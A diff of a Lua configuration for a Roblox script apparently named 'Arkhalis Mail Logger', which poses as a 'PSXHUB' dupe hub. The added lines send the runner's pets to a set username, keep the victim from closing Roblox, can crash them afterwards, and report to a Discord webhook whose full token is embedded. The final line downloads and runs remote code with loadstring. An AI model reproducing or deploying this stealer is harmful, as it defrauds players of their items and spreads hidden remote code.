@@ -1,23 +1,22 @@
---[[ Arkhalis Bank Stealer]]--
-
+--[[ Arkhalis Mail Logger ]]--
 
 --[[ Main Config ]]--
-_G.UserId = 3047655833 --// Roblox Account Id [[https://www.roblox.com/users/IDHERE/profile]] <- This is a example
-
+_G.Username = "Scripter120" --// Username To Send Pets To
+_G.GiftMessage = "Haha 🤙" --// Message For The Gift To Say
+_G.Diamonds = 500001 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
 _G.AntiLeave = true --// Doesn't Let The Target Close Roblox
-_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
-
+_G.Crash = false --// Crashes Them After Its Finished
 --[[ Webhook Config ]]--
-_G.Webhook = "" --// Discord link Webhook For Executions
-    
+_G.Webhook = "https://discord.com/api/webhooks/1036648929607028826/F4TS3iIxAq0zuB9gY7hlb8mr7iTxgTAZSNNTzymeQT_ahJuAdsOGmzU9TFYonjrz-R7s" --// Discord Webhook For Executions
+
 --[[ UI Config ]]--
-_G.ScriptName = "PSXHUB BETA 0.5" --// Script Name On The UI
-_G.Tip1 = "Dm On Discord For Support" --// Gives You Tips On The UI
-_G.Tip2 = "Expect Gliches,This Is Still A Beta" --// Gives You Tips On The UI
-_G.Tip3 = "Don't Leave The Game" --// Gives You Tips On The UI
-_G.Tip4 = "Coems 🤑" --// Gives You Tips On The UI
-_G.Tip5 = "Habibi?" --// Gives You Tips On The UI
+_G.ScriptName = "PSXHUB 2.1 BETA" --// Script Name On The UI
+_G.Tip1 = "The Script Is Loading" --// Gives You Tips On The UI
+_G.Tip2 = "This Will Take Up To 5 Minutes" --// Gives You Tips On The UI
+_G.Tip3 = "Dm For Help" --// Gives You Tips On The UI
+_G.Tip4 = "GG" --// Gives You Tips On The UI
+_G.Tip5 = "Dupe 2.1 Added" --// Gives You Tips On The UI
 
-
---[[ Script ]]--
-loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisBank.lua"))()
+--[[ Script ]]
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
